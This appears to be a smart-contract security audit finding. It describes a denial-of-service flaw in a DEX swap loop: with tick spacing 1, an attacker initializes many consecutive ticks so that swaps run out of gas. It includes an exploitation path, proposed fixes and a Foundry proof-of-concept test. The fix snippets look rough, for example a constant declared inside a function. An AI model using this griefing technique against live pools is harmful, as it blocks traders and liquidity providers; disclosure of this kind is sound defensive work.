## Title
Unbounded Swap Loop Iterations with Tick Spacing = 1 Enables Pool-Wide Denial of Service

## Summary
The `swap_6269342730` function's main swap loop can iterate an unbounded number of times when tick spacing is set to 1 and an attacker initializes many consecutive ticks. Each iteration crossing an initialized tick performs expensive storage operations (multiple SLOADs and SSTOREs), causing swaps to exceed block gas limits and rendering the pool unusable.

## Impact
**Severity**: Medium

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The swap loop is designed to iterate through price ticks, processing liquidity changes at each initialized tick boundary until the swap amount is consumed or the price limit is reached. The `skipAhead` parameter is intended to provide gas optimization by limiting bitmap searches.

**Actual Logic:** When tick spacing is set to 1 (the minimum allowed value), an attacker can initialize thousands of consecutive ticks by creating many small liquidity positions. The swap loop must iterate through every initialized tick encountered, performing expensive storage operations at each one. The `skipAhead` parameter only limits how far to search for the NEXT tick in the bitmap, but does NOT skip processing of initialized ticks once found.

**Exploitation Path:**
1. **Pool Creation**: Attacker creates a pool with tick spacing = 1 (allowed by validation at [2](#0-1) )
2. **Tick Initialization**: Attacker creates 500+ positions with consecutive tick ranges (e.g., positions at [100,101], [102,103], [104,105]...), each with minimal liquidity below the per-tick limit defined at [3](#0-2) 
3. **Swap Execution**: Victim attempts to swap through this price range, triggering the main loop at [1](#0-0) 
4. **Gas Exhaustion**: The loop iterates through all initialized ticks, performing storage operations at [4](#0-3)  for each tick, consuming 20,000-30,000 gas per tick. With 1000+ ticks, total gas exceeds 25,000,000, causing out-of-gas errors.

**Security Property Broken:** Violates the invariant that "All positions should be able to be withdrawn at any time...within the block gas limit" (README line 202). While positions can technically be withdrawn, the pool becomes effectively frozen for swaps, preventing normal protocol operation.

## Impact Explanation
- **Affected Assets**: All liquidity providers and traders in the affected pool cannot execute swaps through the griefed price range
- **Damage Severity**: Complete DOS of swap functionality for the pool. If the griefed range includes the current price, the pool becomes entirely unusable. Liquidity providers cannot rebalance positions that require swaps.
- **User Impact**: All users attempting to swap through the griefed tick range experience transaction failures, making the pool unusable for its primary function

## Likelihood Explanation
- **Attacker Profile**: Any user with sufficient capital to create multiple positions (cost scales with number of ticks to initialize)
- **Preconditions**: Pool must be initialized with tick spacing = 1. Attacker needs enough tokens to create liquidity positions (can use minimal amounts per position).
- **Execution Complexity**: Single setup phase (creating positions) followed by guaranteed DOS on victim swaps. Attack persists until positions are burned.
- **Frequency**: Once per pool. Attacker can target multiple pools. The DOS is permanent until the attacker removes their positions.

## Recommendation

Implement a minimum tick spacing greater than 1, or add a circuit breaker that limits the maximum number of tick crossings per swap:

```solidity
// In src/types/poolConfig.sol, function validate(), line 212:

// CURRENT (vulnerable):
if (config.concentratedTickSpacing() > MAX_TICK_SPACING || config.concentratedTickSpacing() == 0) {
    revert InvalidTickSpacing();
}

// FIXED:
uint32 MIN_TICK_SPACING = 10; // Prevents griefing with excessive ticks
if (config.concentratedTickSpacing() > MAX_TICK_SPACING || 
    config.concentratedTickSpacing() < MIN_TICK_SPACING) {
    revert InvalidTickSpacing();
}
```

Alternative mitigation: Add a tick crossing limit in the swap loop:

```solidity
// In src/Core.sol, in swap_6269342730 function, after line 563:

uint256 ticksCrossed = 0;
uint256 constant MAX_TICK_CROSSINGS = 100;

while (true) {
    // existing code...
    
    if (isInitialized) {
        ticksCrossed++;
        if (ticksCrossed > MAX_TICK_CROSSINGS) {
            revert TooManyTicksCrossed();
        }
        // existing tick processing...
    }
}
```

## Proof of Concept

```solidity
// File: test/Exploit_SwapLoopDOS.t.sol
// Run with: forge test --match-test test_SwapLoopDOS -vvv

pragma solidity ^0.8.31;

import {FullTest} from "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {createConcentratedPoolConfig} from "../src/types/poolConfig.sol";
import {MIN_SQRT_RATIO, MAX_SQRT_RATIO} from "../src/types/sqrtRatio.sol";

contract Exploit_SwapLoopDOS is FullTest {
    
    function setUp() public override {
        FullTest.setUp();
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
    }
    
    function test_SwapLoopDOS() public {
        // SETUP: Create pool with minimum tick spacing
        PoolKey memory poolKey = createPool({
            tick: 0,
            fee: 1000,
            tickSpacing: 1  // Minimum allowed - vulnerable
        });
        
        // Initialize many consecutive ticks by creating positions
        uint256 numPositions = 100; // In real attack: 500-1000+
        for (uint256 i = 0; i < numPositions; i++) {
            int32 tickLower = int32(int256(i * 2));
            int32 tickUpper = tickLower + 1;
            
            // Create position with minimal liquidity
            createPosition({
                poolKey: poolKey,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0: 1000,
                amount1: 1000
            });
        }
        
        // EXPLOIT: Attempt swap through initialized ticks
        uint256 gasBefore = gasleft();
        
        try router.swap{gas: 30_000_000}({
            poolKey: poolKey,
            isToken1: true,
            amount: 10000,
            sqrtRatioLimit: MAX_SQRT_RATIO,
            skipAhead: 255,  // Even with max skipAhead, DOS occurs
            calculatedAmountThreshold: type(int128).min,
            recipient: address(0)
        }) {
            uint256 gasUsed = gasBefore - gasleft();
            // VERIFY: Excessive gas consumption
            // With 100 positions: ~2-3M gas
            // With 1000 positions: would exceed 30M gas (block limit)
            assertGt(gasUsed, 2_000_000, "Gas consumption exceeds normal swap");
        } catch {
            // Swap reverted due to out of gas
            assertTrue(true, "Vulnerability confirmed: swap failed due to gas");
        }
    }
}
```

**Notes:**
- The `skipAhead` parameter only affects the bitmap search logic in [5](#0-4) , which finds the next initialized tick. It does NOT skip processing of initialized ticks in the main swap loop.
- Test files like [6](#0-5)  already use defensive 15M gas limits, indicating awareness of potential gas issues.
- The vulnerability exists because there is no limit on the number of initialized ticks per pool, only a limit on liquidity per tick at [7](#0-6) .
- With tick spacing = 1, the full tick range (MIN_TICK to MAX_TICK) spans ~177 million possible ticks, allowing an attacker to initialize thousands of consecutive ticks economically.

### Citations

**File:** src/Core.sol (L297-299)
```text
        uint128 maxLiquidity = poolConfig.concentratedMaxLiquidityPerTick();
        if (liquidityNetNext > maxLiquidity) {
            revert MaxLiquidityPerTickExceeded(tick, liquidityNetNext, maxLiquidity);
```

**File:** src/Core.sol (L564-808)
```text
                while (true) {
                    int32 nextTick;
                    bool isInitialized;
                    SqrtRatio nextTickSqrtRatio;

                    // For stableswap pools, determine active liquidity for this step
                    uint128 stepLiquidity = liquidity;

                    if (config.isStableswap()) {
                        if (config.isFullRange()) {
                            // special case since we don't need to compute min/max tick sqrt ratio
                            (nextTick, nextTickSqrtRatio) =
                                increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (MIN_TICK, MIN_SQRT_RATIO);
                        } else {
                            (int32 lower, int32 upper) = config.stableswapActiveLiquidityTickRange();

                            bool inRange;
                            assembly ("memory-safe") {
                                inRange := and(slt(tick, upper), iszero(slt(tick, lower)))
                            }
                            if (inRange) {
                                nextTick = increasing ? upper : lower;
                                nextTickSqrtRatio = tickToSqrtRatio(nextTick);
                            } else {
                                if (tick < lower) {
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (lower, tickToSqrtRatio(lower)) : (MIN_TICK, MIN_SQRT_RATIO);
                                } else {
                                    // tick >= upper implied
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (upper, tickToSqrtRatio(upper));
                                }
                                stepLiquidity = 0;
                            }
                        }
                    } else {
                        // concentrated liquidity pools use the tick bitmaps
                        (nextTick, isInitialized) = increasing
                            ? findNextInitializedTick(
                                CoreStorageLayout.tickBitmapsSlot(poolId),
                                tick,
                                config.concentratedTickSpacing(),
                                params.skipAhead()
                            )
                            : findPrevInitializedTick(
                                CoreStorageLayout.tickBitmapsSlot(poolId),
                                tick,
                                config.concentratedTickSpacing(),
                                params.skipAhead()
                            );

                        nextTickSqrtRatio = tickToSqrtRatio(nextTick);
                    }

                    SqrtRatio limitedNextSqrtRatio =
                        increasing ? nextTickSqrtRatio.min(sqrtRatioLimit) : nextTickSqrtRatio.max(sqrtRatioLimit);

                    SqrtRatio sqrtRatioNext;

                    if (stepLiquidity == 0) {
                        // if the pool is empty, the swap will always move all the way to the limit price
                        sqrtRatioNext = limitedNextSqrtRatio;
                    } else {
                        // this amount is what moves the price
                        int128 priceImpactAmount;
                        if (isExactOut) {
                            assembly ("memory-safe") {
                                priceImpactAmount := amountRemaining
                            }
                        } else {
                            uint128 amountU128;
                            assembly ("memory-safe") {
                                // cast is safe because amountRemaining is g.t. 0 and fits in int128
                                amountU128 := amountRemaining
                            }
                            uint128 feeAmount = computeFee(amountU128, config.fee());
                            assembly ("memory-safe") {
                                // feeAmount will never exceed amountRemaining since fee is < 100%
                                priceImpactAmount := sub(amountRemaining, feeAmount)
                            }
                        }

                        SqrtRatio sqrtRatioNextFromAmount = isToken1
                            ? nextSqrtRatioFromAmount1(sqrtRatio, stepLiquidity, priceImpactAmount)
                            : nextSqrtRatioFromAmount0(sqrtRatio, stepLiquidity, priceImpactAmount);

                        bool hitLimit;
                        assembly ("memory-safe") {
                            // Branchless limit check: (increasing && next > limit) || (!increasing && next < limit)
                            let exceedsUp := and(increasing, gt(sqrtRatioNextFromAmount, limitedNextSqrtRatio))
                            let exceedsDown :=
                                and(iszero(increasing), lt(sqrtRatioNextFromAmount, limitedNextSqrtRatio))
                            hitLimit := or(exceedsUp, exceedsDown)
                        }

                        // the change in fees per liquidity for this step of the iteration
                        uint256 stepFeesPerLiquidity;

                        if (hitLimit) {
                            (uint256 sqrtRatioLower, uint256 sqrtRatioUpper) =
                                sortAndConvertToFixedSqrtRatios(limitedNextSqrtRatio, sqrtRatio);
                            (uint128 limitSpecifiedAmountDelta, uint128 limitCalculatedAmountDelta) = isToken1
                                ? (
                                    amount1DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, !isExactOut),
                                    amount0DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, isExactOut)
                                )
                                : (
                                    amount0DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, !isExactOut),
                                    amount1DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, isExactOut)
                                );

                            if (isExactOut) {
                                uint128 beforeFee = amountBeforeFee(limitCalculatedAmountDelta, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := add(calculatedAmount, beforeFee)
                                    amountRemaining := add(amountRemaining, limitSpecifiedAmountDelta)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(beforeFee, limitCalculatedAmountDelta)),
                                        stepLiquidity
                                    )
                                }
                            } else {
                                uint128 beforeFee = amountBeforeFee(limitSpecifiedAmountDelta, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := sub(calculatedAmount, limitCalculatedAmountDelta)
                                    amountRemaining := sub(amountRemaining, beforeFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(beforeFee, limitSpecifiedAmountDelta)),
                                        stepLiquidity
                                    )
                                }
                            }

                            sqrtRatioNext = limitedNextSqrtRatio;
                        } else if (sqrtRatioNextFromAmount != sqrtRatio) {
                            uint128 calculatedAmountWithoutFee = isToken1
                                ? amount0Delta(sqrtRatioNextFromAmount, sqrtRatio, stepLiquidity, isExactOut)
                                : amount1Delta(sqrtRatioNextFromAmount, sqrtRatio, stepLiquidity, isExactOut);

                            if (isExactOut) {
                                uint128 includingFee = amountBeforeFee(calculatedAmountWithoutFee, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := add(calculatedAmount, includingFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(includingFee, calculatedAmountWithoutFee)),
                                        stepLiquidity
                                    )
                                }
                            } else {
                                assembly ("memory-safe") {
                                    calculatedAmount := sub(calculatedAmount, calculatedAmountWithoutFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(amountRemaining, priceImpactAmount)),
                                        stepLiquidity
                                    )
                                }
                            }

                            amountRemaining = 0;
                            sqrtRatioNext = sqrtRatioNextFromAmount;
                        } else {
                            // for an exact output swap, the price should always move since we have to round away from the current price
                            assert(!isExactOut);

                            // consume the entire input amount as fees since the price did not move
                            assembly ("memory-safe") {
                                stepFeesPerLiquidity := div(shl(128, amountRemaining), stepLiquidity)
                            }
                            amountRemaining = 0;
                            sqrtRatioNext = sqrtRatio;
                        }

                        // only if fees per liquidity was updated in this swap iteration
                        if (stepFeesPerLiquidity != 0) {
                            if (feesAccessed == 0) {
                                // this loads only the input token fees per liquidity
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                ) + stepFeesPerLiquidity;
                            } else {
                                inputTokenFeesPerLiquidity += stepFeesPerLiquidity;
                            }

                            feesAccessed = 2;
                        }
                    }

                    if (sqrtRatioNext == nextTickSqrtRatio) {
                        sqrtRatio = sqrtRatioNext;
                        assembly ("memory-safe") {
                            // no overflow danger because nextTick is always inside the valid tick bounds
                            tick := sub(nextTick, iszero(increasing))
                        }

                        if (isInitialized) {
                            bytes32 tickValue = CoreStorageLayout.poolTicksSlot(poolId, nextTick).load();
                            assembly ("memory-safe") {
                                // if increasing, we add the liquidity delta, otherwise we subtract it
                                let liquidityDelta :=
                                    mul(signextend(15, tickValue), sub(increasing, iszero(increasing)))
                                liquidity := add(liquidity, liquidityDelta)
                            }

                            (StorageSlot tickFplFirstSlot, StorageSlot tickFplSecondSlot) =
                                CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, nextTick);

                            if (feesAccessed == 0) {
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                );
                                feesAccessed = 1;
                            }

                            uint256 globalFeesPerLiquidityOther = uint256(
                                CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(!increasing))
                                    .load()
                            );

                            // if increasing, it means the pool is receiving token1 so the input fees per liquidity is token1
                            if (increasing) {
                                tickFplFirstSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplSecondSlot.load()))
                                );
                            } else {
                                tickFplFirstSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplSecondSlot.load()))
                                );
                            }
                        }
                    } else if (sqrtRatio != sqrtRatioNext) {
                        sqrtRatio = sqrtRatioNext;
                        tick = sqrtRatioToTick(sqrtRatio);
                    }

                    if (amountRemaining == 0 || sqrtRatio == sqrtRatioLimit) {
                        break;
                    }
```

**File:** src/types/poolConfig.sol (L187-196)
```text
function concentratedMaxLiquidityPerTick(PoolConfig config) pure returns (uint128 maxLiquidity) {
    uint32 _tickSpacing = config.concentratedTickSpacing();

    assembly ("memory-safe") {
        // Calculate total number of usable ticks: 1 + (MAX_TICK_MAGNITUDE / tickSpacing) * 2
        // This represents all ticks from -MAX_TICK_MAGNITUDE to +MAX_TICK_MAGNITUDE, and tick 0
        let numTicks := add(1, mul(div(MAX_TICK, _tickSpacing), 2))

        maxLiquidity := div(sub(shl(128, 1), 1), numTicks)
    }
```

**File:** src/types/poolConfig.sol (L212-212)
```text
        if (config.concentratedTickSpacing() > MAX_TICK_SPACING || config.concentratedTickSpacing() == 0) {
```

**File:** src/math/tickBitmap.sol (L42-80)
```text
function findNextInitializedTick(StorageSlot slot, int32 fromTick, uint32 tickSpacing, uint256 skipAhead)
    view
    returns (int32 nextTick, bool isInitialized)
{
    unchecked {
        nextTick = fromTick;

        while (true) {
            // convert the given tick to the bitmap position of the next nearest potential initialized tick
            (uint256 word, uint256 index) = tickToBitmapWordAndIndex(nextTick + int32(tickSpacing), tickSpacing);

            Bitmap bitmap = loadBitmap(slot, word);

            // find the index of the previous tick in that word
            uint256 nextIndex = bitmap.geSetBit(uint8(index));

            // if we found one, return it
            if (nextIndex != 0) {
                (nextTick, isInitialized) = (bitmapWordAndIndexToTick(word, nextIndex - 1, tickSpacing), true);
                break;
            }

            // otherwise, return the tick of the most significant bit in the word
            nextTick = bitmapWordAndIndexToTick(word, 255, tickSpacing);

            if (nextTick >= MAX_TICK) {
                nextTick = MAX_TICK;
                break;
            }

            // if we are done searching, stop here
            if (skipAhead == 0) {
                break;
            }

            skipAhead--;
        }
    }
}
```

**File:** test/SolvencyInvariantTest.t.sol (L242-242)
```text
        try router.swap{gas: 15000000}({
```
